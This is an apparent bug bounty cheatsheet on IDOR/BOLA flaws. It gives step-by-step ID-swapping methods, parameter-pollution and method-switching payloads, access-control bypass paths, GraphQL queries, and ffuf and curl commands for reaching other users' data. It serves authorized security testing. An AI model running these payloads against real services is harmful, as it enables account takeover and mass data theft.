---
tags: [bugbounty, vuln/idor, cheatsheet, p1, p2, p3]
aliases: [Insecure Direct Object Reference, IDOR, BOLA]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# IDOR — Insecure Direct Object Reference (BOLA)

> [!tldr] Hunter Summary
> **What:** Access/modify another user's objects by manipulating IDs/references.
> **Impact:** Data breach, ATO, privilege escalation. P1 if mass exfil, P2 individual.
> **Best targets:** API endpoints with IDs, user profile, file download, invoice/order endpoints.
> **Time to triage:** Two accounts + swap IDs = 5–15 min per endpoint.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Numeric IDs | `?id=123`, `/users/456`, `/orders/789` |
| UUIDs | Even UUIDs can be leaked in other responses or predictable |
| Indirect refs | `?file=invoice.pdf`, `?doc=contract_2024` |
| API endpoints | `/api/v1/user/profile`, `/api/v2/messages/{id}` |
| GraphQL | `query { user(id: 1) }` |
| Hashed IDs | Base64 decode → may reveal sequential underlying ID |
| Outdated API versions | `/v1/` endpoint when app uses `/v2/` |

---

## Step-by-Step Hunt

### Step 1 — Two-account setup
Register Account A (attacker) and Account B (victim). Log into both. Note their user IDs from profile pages, Burp traffic, or API responses.

### Step 2 — Map ID-containing requests
In Burp, filter for all requests containing:
```
id=  user_id=  uid=  account=  profile=  doc=  file=  order=
/user/  /profile/  /account/  /document/  /order/  /api/
```

### Step 3 — Direct ID swap
Take Account B's user ID. With Account A's session/token, make requests using Account B's ID:
```http
GET /api/v1/users/ACCOUNT_B_ID HTTP/1.1
Authorization: Bearer ACCOUNT_A_TOKEN
```

### Step 4 — Wrapping and encoding tricks
```json
// Wrap in array
{"user_id": [VICTIM_ID]}

// Wrap in object  
{"user_id": {"user_id": VICTIM_ID}}

// JSON parameter pollution
{"user_id": "MY_ID", "user_id": "VICTIM_ID"}

// Add .json extension
GET /v2/GetData/VICTIM_ID.json

// Wildcard
GET /api/users/*
GET /api/users/%
GET /api/users/_
```

### Step 5 — HTTP parameter pollution
```http
POST /api/get_profile HTTP/1.1

user_id=MY_ID&user_id=VICTIM_ID
```

### Step 6 — Older API versions
```
POST /v1/GetData   (app uses /v2/)
GET /api/v1/users/VICTIM_ID   (app uses /v2/)
```

### Step 7 — HTTP method switching
```
GET /api/v1/users/VICTIM_ID   → 403
POST /api/v1/users/VICTIM_ID  → 200
PUT /api/v1/users/VICTIM_ID   → 200
PATCH /api/v1/users/VICTIM_ID → 200
```

### Step 8 — Content-Type switching
```
Content-Type: application/xml  → try application/json
Content-Type: application/json → try text/plain or application/x-www-form-urlencoded
```

### Step 9 — Missing Function Level Access Control
```
GET /admin/profile    → 403
GET /ADMIN/profile    → 200?
GET /Admin/Profile    → 200?
GET /admin%2fprofile  → 200?
```

### Step 10 — GraphQL IDOR
```graphql
{ user(id: 1) { email username role } }
{ user(id: 2) { email username role } }
# Also try introspection:
{ __schema { types { name fields { name } } } }
```

### Step 11 — Path traversal on ID
```
GET /api/v1/users/MY_ID/../VICTIM_ID
GET /api/v1/users/VICTIM_ID/../../admin
```

---

## Payload Quick Ref

```
# ID swap (most basic)
/api/user/123 → /api/user/124

# UUID swap (B's UUID from other endpoints/emails)
/api/user/550e8400-e29b-41d4-a716-446655440000

# Add param to paramless endpoint
GET /api/v1/getuser → GET /api/v1/getuser?id=VICTIM_ID

# Decode hashed ID: dmljdGltQG1haWwuY29t = victim@mail.com
curl "https://target.com/user/$(echo -n victim@mail.com | base64)"

# UUID → integer swap
GET /file?id=90ri2-xozifke-29ikedaw0d → GET /file?id=302
```

---

## 2025-2026 Updates

> [!info] New IDOR surface (2025-2026)
> - **AI conversation IDORs:** Chat history endpoints often sequential (`/ai/chat/12345`) with minimal auth
> - **WebSocket IDOR:** Subscription message with another user's resource ID
> - **GraphQL batch queries:** `[{user(id:1)},{user(id:2)},...{user(id:100)}]` — one request, 100 users
> - **Mobile API v1 IDORs:** Older API versions exposed for backwards compat, less tested
> - **PDF/export IDORs:** `?report_id=123` with no authorization check — common in B2B SaaS
> - **Webhook log IDORs:** `GET /webhooks/VICTIM_WEBHOOK_ID/deliveries`

---

## Chain Ideas

| IDOR → | Result |
|--------|--------|
| IDOR on email endpoint | → Change victim email → password reset → ATO |
| IDOR on admin object | → Privilege escalation |
| IDOR on API key/token | → Full account access |
| Mass IDOR | → P1 data breach |
| IDOR + rate limit bypass | → Automated mass extraction |

---

## Tools

| Tool | Use |
|------|-----|
| Burp Autorize | Automatic — replaces session and retests all requests |
| `ffuf` | `ffuf -u "https://t.com/api/user/FUZZ" -w ids.txt -H "Auth: TOKEN_A"` |
| Burp Match & Replace | Swap your ID for victim ID in all requests |
| `arjun` | Find hidden parameters: `arjun -u https://target.com/api/user` |
| `param-miner` | Burp extension — finds hidden params |

---

## References

- PortSwigger IDOR — https://portswigger.net/web-security/access-control/idor
- OWASP BOLA/IDOR — https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
- HackTricks IDOR — https://book.hacktricks.xyz/pentesting-web/idor
